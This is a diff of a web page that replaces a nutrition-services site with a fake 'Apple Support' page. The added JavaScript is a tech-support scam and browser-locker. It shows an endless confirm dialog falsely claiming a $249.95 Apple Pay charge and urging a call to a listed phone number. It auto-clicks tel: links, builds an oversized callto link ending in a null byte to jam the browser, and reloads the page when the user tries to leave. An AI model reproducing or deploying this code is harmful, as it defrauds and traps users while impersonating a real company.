+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-        <div class="header-content">
-          <h2 class="animation-element">Welcome to Puregrazenate, your trusted partner in personalized nutrition guidance. Our expert nutritionists are here to help you achieve your health and wellness goals through tailored plans and ongoing support. Discover a balanced approach to eating that fits your lifestyle and promotes long-term well-being.</h2>
-          <a class="animation-element" href="./#next-block"
-            ><svg
-              xmlns="http://www.w3.org/2000/svg"
-              xmlns:xlink="http://www.w3.org/1999/xlink"
-              version="1.1"
-              id="Capa_1"
-              x="0px"
-              y="0px"
-              width="284.929px"
-              height="284.929px"
-              viewBox="0 0 284.929 284.929"
-              style="enable-background: new 0 0 284.929 284.929"
-              xml:space="preserve"
-            >
-              <g>
-                <path
-                  d="M282.082,76.511l-14.274-14.273c-1.902-1.906-4.093-2.856-6.57-2.856c-2.471,0-4.661,0.95-6.563,2.856L142.466,174.441   L30.262,62.241c-1.903-1.906-4.093-2.856-6.567-2.856c-2.475,0-4.665,0.95-6.567,2.856L2.856,76.515C0.95,78.417,0,80.607,0,83.082   c0,2.473,0.953,4.663,2.856,6.565l133.043,133.046c1.902,1.903,4.093,2.854,6.567,2.854s4.661-0.951,6.562-2.854L282.082,89.647   c1.902-1.903,2.847-4.093,2.847-6.565C284.929,80.607,283.984,78.417,282.082,76.511z"
-                />
-              </g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-              <g></g>
-            </svg>
-          </a>
-        </div>
-      </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-855-692-3966 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
 
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-855-692-3966
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
     <script>
-      let itemTogNavig = document.querySelector('.toggle-navigation');
-      let menuNavigation = document.querySelector('.menu-navigation');
-      let navigationLinks = document.querySelectorAll('.navigation-link');
-      let body = document.body;
-
-      function menuNavig() {
-        itemTogNavig.classList.remove('active');
-        menuNavigation.classList.remove('active');
-        body.style.overflow = '';
-      }
-
-      itemTogNavig.addEventListener('click', function () {
-        itemTogNavig.classList.toggle('active');
-        menuNavigation.classList.toggle('active');
-        if (menuNavigation.classList.contains('active')) {
-          body.style.overflow = 'hidden';
-        } else {
-          body.style.overflow = '';
-        }
-      });
-
-      navigationLinks.forEach(function (link) {
-        link.addEventListener('click', menuNavig);
-      });
-    </script>
-
-    <script>
-      document.addEventListener('DOMContentLoaded', function () {
-        const elements = document.querySelectorAll('.animation-element');
-
-        function vizibCheK() {
-          const windowHeight = window.innerHeight;
-
-          elements.forEach((element) => {
-            const rect = element.getBoundingClientRect();
-
-            if (rect.top < windowHeight && rect.bottom > 0) {
-              element.classList.add('visible');
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
             }
-          });
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-855-692-3966');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
         }
 
-        window.addEventListener('scroll', vizibCheK);
-        vizibCheK();
-      });
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-855-692-3966"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-855-692-3966 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
     </script>
 
-    
 
-    <div class="basic-content-nav">
-      <a href="./#next-block"
-        ><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle></svg>
-      </a>
-      <a href="./#how-work"
-        ><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle></svg>
-      </a>
-      <a href="./#aboutus"
-        ><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle></svg>
-      </a>
-      <a href="./#art-page"
-        ><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle></svg>
-      </a>
-      <a href="./#part"
-        ><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle></svg>
-      </a>
-        
-    </div>
 
-    <div class="conteinSektion">
-      <div class="reasons search-fieldkl" id="next-block">
-        <h2>Motives that brought you to our platform:</h2>
-        <div class="reasons-box animation-element">
-          <div class="reasons-card">
-            <h5><span>1 /</span>Seeking expert advice to improve diet and overall health with personalized nutrition plans.</h5>
-          </div>
-          <div class="reasons-card">
-            <h5><span>2 /</span>Looking for guidance on managing specific health conditions through proper nutrition.</h5>
-          </div>
-          <div class="reasons-card">
-            <h5><span>3 /</span>Interested in adopting a healthier lifestyle supported by professional coaching and support.</h5>
-          </div>
-        </div>
-        <div class="reasons-img">
-          <img src="files/img/vector2_2026-08-05_08-460.svg"  />
-        </div>
-        
-      </div>
-    </div>
 
-    <div class="how-work-lay" id="how-work">
-      <div class="conteinSektion">
-        <div class="how-work">
-          <h2>From Idea to Implementation: The Journey of Our Healthy Food</h2>
-          <div class="how-work-box animation-element">
-            <div class="how-work-card">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-chat-left-dots"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M14 1a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H4.414A2 2 0 0 0 3 11.586l-2 2V2a1 1 0 0 1 1-1zM2 0a2 2 0 0 0-2 2v12.793a.5.5 0 0 0 .854.353l2.853-2.853A1 1 0 0 1 4.414 12H14a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2z"
-                />
-                <path
-                  d="M5 6a1 1 0 1 1-2 0 1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0 1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0 1 1 0 0 1 2 0"
-                />
-              </svg>
-              <span></span>
-              <p>Initial Consultation: We start by understanding your health history, lifestyle, and dietary preferences to create a personalized nutrition profile.</p>
-            </div>
-            <div class="how-work-card">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-lightbulb"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M2 6a6 6 0 1 1 10.174 4.31c-.203.196-.359.4-.453.619l-.762 1.769A.5.5 0 0 1 10.5 13a.5.5 0 0 1 0 1 .5.5 0 0 1 0 1l-.224.447a1 1 0 0 1-.894.553H6.618a1 1 0 0 1-.894-.553L5.5 15a.5.5 0 0 1 0-1 .5.5 0 0 1 0-1 .5.5 0 0 1-.46-.302l-.761-1.77a2 2 0 0 0-.453-.618A5.98 5.98 0 0 1 2 6m6-5a5 5 0 0 0-3.479 8.592c.263.254.514.564.676.941L5.83 12h4.342l.632-1.467c.162-.377.413-.687.676-.941A5 5 0 0 0 8 1"
-                />
-              </svg>
-              <span></span>
-              <p>Customized Plan Development: Based on your goals and needs, we design a tailored nutrition plan that is realistic and sustainable.</p>
-            </div>
-            <div class="how-work-card">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-share"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M13.5 1a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3M11 2.5a2.5 2.5 0 1 1 .603 1.628l-6.718 3.12a2.5 2.5 0 0 1 0 1.504l6.718 3.12a2.5 2.5 0 1 1-.488.876l-6.718-3.12a2.5 2.5 0 1 1 0-3.256l6.718-3.12A2.5 2.5 0 0 1 11 2.5m-8.5 4a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3m11 5.5a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3"
-                />
-              </svg>
-              <span></span>
-              <p>Ongoing Support and Monitoring: Regular check-ins help track progress, address challenges, and adjust plans as needed.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
 
-    <div class="conteinSektion">
-      <div class="about-us" id="aboutus">
-        <h2>About us</h2>
-        <div class="about-us-box animation-element">
-          <p>At Puregrazenate, we believe that nutrition is the foundation of a healthy life. Our team of certified nutritionists combines the latest scientific research with personalized care to create nutrition plans that suit your unique needs and preferences. We focus on sustainable habits that enhance energy, improve digestion, and support overall wellness. Whether you're looking to manage weight, boost immunity, or optimize performance, Puregrazenate offers expert guidance every step of the way. Our commitment is to empower you with knowledge and practical tools for lasting health improvements.</p>
-        </div>
-      </div>
-    </div>
-
-    <div class="art-page-lay" id="art-page">
-      <div class="conteinSektion">
-        <div class="art-content">
-          <h2>Nutritionist - a personalized approach to your habits and lifestyle</h2>
-          <div class="art-block">
-            <img class="art-block-images" src="posts/09-08-2026/service_nutritionist_2026-08-08_2.jpg" alt="Nutritionist - a personalized approach to your habits and lifestyle" />
-            <div class="art-block-content"><p><span>The modern pace of life presents us with dozens of daily challenges. Work, family, meetings, travel, education, leisure, and household chores all create a unique routine in which nutrition plays an important, yet not always obvious, role.</span></p><p> <span>Our company offers</span> <strong><span>professional nutritionist services</span></strong> <span>for those who want to take a closer look at their eating habits, better understand the principles of diet planning, and receive personalized recommendations tailored to their daily lives.</span></p><p> <span>We don't believe in one-size-fits-all formulas or cookie-cutter solutions. Each person has their own schedule, preferences, habits, tastes, and goals. That's why working with a nutritionist is based primarily on</span> <strong><span>an individual approach</span></strong> <span>.</span></p><h2> <span>Personal consultation with a nutritionist</span></h2><p> <span>A consultation is an opportunity to review your usual diet in detail with a specialist and understand how it currently works.</span></p><p> <span>A nutritionist analyzes daily eating habits, preferences, and dietary patterns, asks relevant questions, and helps organize the information. This approach allows for a clearer picture and identifies areas that require attention.</span></p><p> <span>Moreover, recommendations are formed not in isolation from reality, but taking into account a person’s specific lifestyle.</span></p><p> <span>For example, some people spend most of their day in the office and have little opportunity to cook. Others work from home. Some have constantly changing schedules, while others travel frequently or spend a lot of time on the road. Some prefer to cook for themselves, while others regularly visit cafes and restaurants or use delivery services.</span></p><p> <span>All these circumstances matter.</span></p><p> <strong><span>The specialist's task is to offer a clear and realistic approach that can be organically integrated into the usual daily routine.</span></strong></p><h2> <span>No generic templates</span></h2><p> <span>One of the main features of our service is personalization.</span></p><p> <span>A ready-made, one-size-fits-all approach rarely takes into account a specific person's circumstances. Therefore, the specialist begins with an introduction: it's important to understand not only what's typically on the</span> <strong><span>client's desk but also how their daily life is structured</span></strong> <span>.</span></p><p> <span>During the consultation the following may be discussed:</span></p><ul><li> <span>usual daily routine;</span></li><li> <span>time and number of meals;</span></li><li> <span>favorite foods and dishes;</span></li><li> <span>products that a person prefers not to use;</span></li><li> <span>features of the work schedule;</span></li><li> <span>habits during travel and trips;</span></li><li> <span>frequency of visiting cafes and restaurants;</span></li><li> <span>use of delivery services;</span></li><li> <span>attitude towards cooking;</span></li><li> <span>family eating habits;</span></li><li> <span>budget and availability of products;</span></li><li> <span>personal preferences and set tasks.</span></li></ul><p> <span>Based on this information, the specialist can prepare recommendations that are suitable for a specific person.</span></p><h2> <span>Clear information instead of complex rules</span></h2><p> <span>There's a huge amount of information about nutrition these days. Articles, social media, blogs, videos, and advice often offer completely different approaches. Understanding it all on your own can be challenging.</span></p><p> <span>Working with a nutritionist helps</span> <strong><span>structure information and translate it into understandable language</span></strong> <span>.</span></p><p> <span>A specialist can explain how to read food ingredients, what to look for when choosing items in the store, how to navigate a large number of options, and what principles can be used to create a varied menu.</span></p><p> <span>Instead of dozens of disparate pieces of advice, the client receives a consistent system of recommendations.</span></p><p> <span>Our goal is to make interaction with a specialist comfortable, understandable, and practical.</span></p><h2> <span>A diet that takes your preferences into account</span></h2><p> <span>Food isn't just a collection of ingredients. It's about tastes, family traditions, favorite recipes, familiar breakfasts, lunches with coworkers, dinners at home, restaurant outings, and a multitude of small daily decisions.</span></p><p> <span>Therefore, an individual approach necessarily implies respect for a person’s preferences.</span></p><p> <span>If a client has a preference for certain foods, the specialist takes this into account when preparing recommendations. If certain foods are disliked or unsuitable for personal reasons, alternatives can be found.</span></p><p> <span>A nutritionist can also help add variety to a regular menu, suggesting new food combinations and meal ideas that meet the client's preferences and fit into their schedule.</span></p><p> <strong><span>The main principle is that recommendations should be applicable in everyday life and not exist only on paper.</span></strong></p><h2> <span>Practical solutions for every day</span></h2><p> <span>A good consultation ends not with general discussions, but with concrete and clear solutions.</span></p><p> <span>Depending on the chosen format of collaboration, a nutritionist can help create a sample menu structure, select options for breakfast, lunch, dinner, and snacks, offer ideas for cooking at home, or help navigate the selection of prepared meals.</span></p><p> <span>Particular attention can be paid to situations that a person encounters regularly.</span></p><p> <span>For example:</span> <strong><span>what to choose for breakfast if you're short on time in the morning? What foods are best to keep at home? What to take to the office? How to organize your shopping for several days? How to choose food at a cafe? What options are suitable for traveling?</span></strong></p><p> <span>It is precisely these everyday questions that often become the main part of working with a specialist.</span></p><h2> <span>Support and feedback</span></h2><p> <span>Sometimes a single consultation is enough to obtain the necessary information and determine the next step. In other cases, a supportive approach is more convenient.</span></p><p> <span>Support allows you to gradually implement recommendations, ask questions, and adjust individual details together with a specialist.</span></p><p> <span>After all, everyday life changes: business trips, vacations, new work schedules, family events, or simply new preferences appear.</span></p><p> <span>A nutritionist helps adapt recommendations to these changes and find convenient solutions for different circumstances.</span></p><p> <span>This format is especially valuable for people who like to move gradually and have the opportunity to discuss practical issues with a specialist as they arise.</span></p><h2> <span>Informed choice without unnecessary complexity</span></h2><p> <span>We strive to make nutritionist consultations a space for calm and constructive dialogue.</span></p><p> <span>There's no need to conform to any "ideal" lifestyle. Instead, the starting point is how</span> <strong><span>one currently lives</span></strong> <span>.</span></p><p> <span>A specialist helps you look at your usual diet from a different perspective, understand your own preferences, and make your daily choices more understandable and organized.</span></p><p> <span>This could involve a variety of things: planning shopping, menu planning, choosing groceries, cooking at home, going out to restaurants, or managing meals during a busy workday.</span></p><p> <span>No one-size-fits-all scenarios – only solutions that take into account individual requests.</span></p><h2> <span>Why you should contact our nutritionist</span></h2><p> <span>We offer a professional service that focuses on the individual, their lifestyle and their goals.</span></p><p> <span>It's important to us that clients receive not just a set of recommendations, but</span> <strong><span>a clear, personalized action plan</span></strong> <span>that's truly easy to use.</span></p><p> <span>The work is structured sequentially: getting to know and defining the needs, analyzing habits and routines, discussing preferences, preparing individual recommendations and, if necessary, providing further support.</span></p><p> <span>We value comfortable communication, a sensitive approach, and the opportunity to ask questions. The nutritionist explains recommendations in simple terms and helps you understand the details without overloading you with complex terminology.</span></p><h2> <span>Your diet - your rules, our knowledge and support</span></h2><p> <span>Each person has their own habits, favorite foods, routine, and sense of comfort. Therefore, recommendations should be tailored to the individual.</span></p><p> <strong><span>Our nutritionist's services provide a professional perspective on your typical diet, help organize information, and develop a personalized approach to your daily food and meal choices.</span></strong></p><p> <span>A specialist will help you understand your questions, offer practical ideas, and prepare recommendations based on your schedule, preferences, and lifestyle.</span></p><p> <span>No templates. No need to completely change your routine. No complicated or confusing rules.</span></p><p> <span>Only</span> <strong><span>an individual approach, clear recommendations, practical solutions and professional support</span></strong> <span>.</span></p><p> <span>You can choose a one-time consultation or a long-term collaboration with a specialist, depending on your goals and preferences.</span></p><p> <strong><span>Start with a personal consultation with a nutritionist and discover a more understandable, organized, and personalized approach to your daily diet.</span></strong></p></div>
-          </div>
-           
-        </div>
-      </div>
-    </div>
-
-    <div class="conteinSektion">
-      <div class="partners" id="part">
-        <h2>Our Partners</h2>
-        <div class="companiLogo-box animation-element">
-          <div class="companiLogo-img">
-            <img src="files/img/partners-thumb_q800.png"  />
-          </div>
-          <div class="companiLogo-img">
-            <img src="files/img/partners-thumb_q801.png"  />
-          </div>
-          <div class="companiLogo-img">
-            <img src="files/img/partners-thumb_q802.png"  />
-          </div>
-          <div class="companiLogo-img">
-            <img src="files/img/partners-thumb_q803.png"  />
-          </div>
-          <div class="companiLogo-img">
-            <img src="files/img/partners-thumb_q804.png"  />
-          </div>
-          <div class="companiLogo-img">
-            <img src="files/img/partners-thumb_q805.png"  />
-          </div>
-        </div>
-      </div>
-    </div>
-
-     
-    
-     
-    
-    
-
-    <div class="footer-lay offer-columniz">
-      <div class="conteinSektion">
-        <div class="footer">
-          <a class="logo-footer" href="./">
-            <div class="logoImg-footer"><img src="icon.svg"  /></div>
-            <div class="logoTitle-footer"><h2>Puregrazenate</h2></div>
-          </a>
-          <ul class="menu-footer">
-            <span></span>
-            <li><a href="./">Home</a></li>
-            <li><a href="./#aboutus">About us</a></li>
-            <li><a href="./#part">Our Partners</a></li>
-           
-          </ul>
-          <div class="privacy">
-            <span></span>
-            <a href="privacyPolicy.html">Privacy policy</a>
-            <a href="terms.html">Terms & Conditions</a>
-            <a href="legal-disclaimer.html">Disclaimer</a>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="conteinSektion">
-      <div class="footer-bottom">
-        <p>&#169; 2026 Puregrazenate</p>
-      </div>
-    </div>
-
-    
-    
-     
-     
-  </body>
-</html>
-
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
